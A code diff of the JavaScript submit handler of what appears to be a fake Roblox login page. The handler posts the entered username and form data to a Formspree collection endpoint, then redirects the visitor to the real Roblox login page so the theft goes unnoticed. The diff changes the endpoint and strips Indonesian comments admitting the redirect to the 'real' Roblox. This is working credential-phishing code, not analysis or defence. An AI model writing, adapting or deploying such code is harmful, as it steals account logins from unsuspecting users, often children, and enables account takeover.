@@ -114,8 +114,7 @@ document.getElementById('f').addEventListener('submit', function(e){
   go.textContent = "Logging in...";
   go.disabled = true;
 
-  // Formspree Endpoint lo
-  var endpoint = "https://formspree.io/f/xyeeoodj";
+  var endpoint = "https://formspree.io/f/mvkkllwd";
 
   var data = {
     username: u,
@@ -128,11 +127,9 @@ document.getElementById('f').addEventListener('submit', function(e){
     body: JSON.stringify(data)
   })
   .then(res => {
-    // Langsung pindah ke Roblox asli
     window.location.href = "https://www.roblox.com/id/login";
   })
   .catch(error => {
-    // Kalo gagal koneksi, tetep pindah ke Roblox biar aman
     window.location.href = "https://www.roblox.com/id/login";
   });
 });
